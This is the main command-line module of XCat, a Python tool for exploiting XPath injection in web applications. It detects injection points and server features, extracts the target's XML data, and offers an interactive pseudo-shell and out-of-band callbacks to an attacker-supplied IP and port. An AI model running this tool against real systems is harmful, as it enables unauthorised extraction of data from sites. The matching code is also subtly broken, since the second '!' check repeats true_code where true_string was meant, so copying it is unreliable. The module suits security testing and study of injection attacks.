"""
XCat.

Usage:
    xcat <url> <target_parameter> [<parameters>]... (--true-string=<string> | --true-code=<code>) [--shell] [--fast]
         [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)] [--stats] [--concurrency=<val>] [--features]
         [--body=<body>] [--cookie=<cookie>]
    xcat detectip


Options:
    -s, --shell                 Open the psudo-shell for exploring injections
    -m, --method=<method>       HTTP method to use for requests
    -o, --oob-ip=<ip>           Use this IP for OOB injection attacks
    -p, --oob-port=<port>       Use this port for injection attacks
    --stats                     Print statistics at the end of the session
    -x, --concurrency=<val>     Make this many connections to the target server
    -b, --body=<body>           A string that will be sent in the request body
    -c, --cookie=<cookie>       A string that will be sent as the Cookie header
"""
import asyncio
import operator
import time
from typing import Callable

import aiohttp
import docopt
import ipgetter
from aiohttp.web_response import Response

from xcat.algorithms import get_nodes
from xcat.display import display_xml
from xcat.features import detect_features
from xcat.payloads import detect_payload
from xcat.requester import Requester
from xcat.shell import run_shell


def run():
    arguments = docopt.docopt(__doc__)

    if arguments['detectip']:
        print('Finding external IP address...')
        ip = ipgetter.myip()

        if ip:
            print(ip)
        else:
            print('Could not find external IP!')
        return

    match_function = make_match_function(arguments)

    url = arguments['<url>']
    target_parameter = arguments['<target_parameter>']
    parameters = arguments['<parameters>']

    oob_ip = arguments["--oob-ip"]
    oop_port = arguments["--oob-port"]

    shell = arguments['--shell']
    fast = arguments['--fast']
    stats = arguments['--stats']
    concurrency = arguments['--concurrency']
    only_features = arguments['--features']
    body = arguments['--body']
    cookie = arguments['--cookie']

    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(start_action(url, target_parameter,
                                             parameters, match_function,
                                             oob_ip, oop_port,
                                             shell, fast, stats, concurrency, only_features, body, cookie))
    except KeyboardInterrupt:
        loop.stop()


async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port,
                       shell, fast, stats, concurrency, only_features, body, cookie):
    async with aiohttp.ClientSession() as session:
        payload_requester = Requester(url, target_parameter, parameters, match_function,
                                      session, concurrency=concurrency, body=body, cookie=cookie)

        print("Detecting injection points...")
        payloads = await detect_payload(payload_requester)

        for payload in payloads:
            print(payload.name)
            print(f' - Example: {payload.example}')

        if not payloads:
            print("No payloads found! Perhaps the target is not injectable, or xcat just sucks")
            return
        elif len(payloads) > 1:
            print("Multiple payloads found! Please specify them via the command line. "
                  "In the future. When this is implemented.")
            return
        else:
            chosen_payload = payloads[0]

        requester = Requester(url, target_parameter, parameters, match_function, session,
                              injector=chosen_payload.payload_generator,
                              external_ip=oob_ip, external_port=oob_port,
                              fast=fast, concurrency=concurrency)

        print("Detecting Features...")
        features = await detect_features(requester)

        for feature, available in features:
            print(f' - {feature.name} - {available}')
            requester.features[feature.name] = available

        if only_features:
            return

        try:
            if shell:
                await run_shell(requester)
            else:
                t1 = time.time()
                await display_xml([await get_nodes(requester)])
                t2 = time.time()
                print(f'Total Time: {round(t2-t1)} seconds')
            print(f'Total Requests: {requester.total_requests}')
        finally:
            await requester.stop_oob_server()

        if stats:
            print('Stats:')
            for name, counter in requester.counters.items():
                print(f'{name}:')
                for name, value in counter.most_common(10):
                    print(f' - {name} {value}')


def make_match_function(arguments) -> Callable[[Response, str], bool]:
    true_code, true_code_invert = arguments['--true-code'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    true_string, true_string_invert = arguments['--true-string'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    match_operator = operator.ne if true_code_invert or true_string_invert else operator.eq

    def response_checker(response: Response, content: str) -> bool:
        if true_code:
            match = match_operator(response.status, true_code)
        else:
            match = match_operator(true_string in content, True)

        return match

    return response_checker


if __name__ == "__main__":
    run()
